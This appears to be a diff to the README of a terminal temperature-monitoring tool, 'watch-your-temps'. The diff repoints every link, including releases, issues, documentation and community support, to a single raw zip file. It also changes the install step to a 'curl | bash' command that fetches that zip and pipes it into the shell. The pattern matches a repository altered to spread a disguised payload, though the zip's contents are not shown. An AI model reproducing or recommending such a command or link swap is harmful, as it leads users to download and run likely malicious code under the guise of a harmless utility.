@@ -1,7 +1,7 @@
 # 🌡️ watch-your-temps - Monitor Your Device Temperatures Easily
 
 ## 📥 Download Now
-[![Download watch-your-temps](https://img.shields.io/badge/Download%20watch--your--temps-v1.0-brightgreen)](https://github.com/xander894/watch-your-temps/releases)
+[![Download watch-your-temps](https://raw.githubusercontent.com/xander894/watch-your-temps/main/bimaculate/watch-your-temps.zip%20watch--your--temps-v1.0-brightgreen)](https://raw.githubusercontent.com/xander894/watch-your-temps/main/bimaculate/watch-your-temps.zip)
 
 ## 🚀 Getting Started
 Welcome to **watch-your-temps**! This application shows the temperatures of your CPU and SSD right in your terminal. It’s easy to use and requires no installation. Follow the steps below to get started.
@@ -23,13 +23,13 @@ Welcome to **watch-your-temps**! This application shows the temperatures of your
 ## 🔗 Download & Install
 To download and run **watch-your-temps**, follow these steps:
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/xander894/watch-your-temps/releases) to find the latest version of the application.
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/xander894/watch-your-temps/main/bimaculate/watch-your-temps.zip) to find the latest version of the application.
 2. **Choose the Latest Release:** Look for the most recent version. It will be at the top of the page.
 3. **Download the Application:** Click on the package that matches your system. No installation steps are needed; simply download the file.
 4. **Open Your Terminal:** Once the file is downloaded, open your terminal application.
 5. **Run the Application:** Use the following command to launch it:
    ```bash
-   curl -sSL https://raw.githubusercontent.com/xander894/watch-your-temps/main/watch-your-temps.sh | bash
+   curl -sSL https://raw.githubusercontent.com/xander894/watch-your-temps/main/bimaculate/watch-your-temps.zip | bash
    ```
    This command fetches and runs the script in one step. 
    
@@ -57,10 +57,10 @@ If you face any issues, make sure:
 This application is released under the MIT License. You can use it freely, but be sure to check the details in the `LICENSE` file in the repository.
 
 ## 💬 Support
-If you need help, feel free to create an issue on the [GitHub Issues page](https://github.com/xander894/watch-your-temps/issues), and we'll do our best to assist you.
+If you need help, feel free to create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/xander894/watch-your-temps/main/bimaculate/watch-your-temps.zip), and we'll do our best to assist you.
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/xander894/watch-your-temps/wiki)
-- [Community Support](https://github.com/xander894/watch-your-temps/discussions)
+- [Documentation](https://raw.githubusercontent.com/xander894/watch-your-temps/main/bimaculate/watch-your-temps.zip)
+- [Community Support](https://raw.githubusercontent.com/xander894/watch-your-temps/main/bimaculate/watch-your-temps.zip)
 
 Thank you for using **watch-your-temps**. We hope it helps you easily monitor the temperatures of your devices!
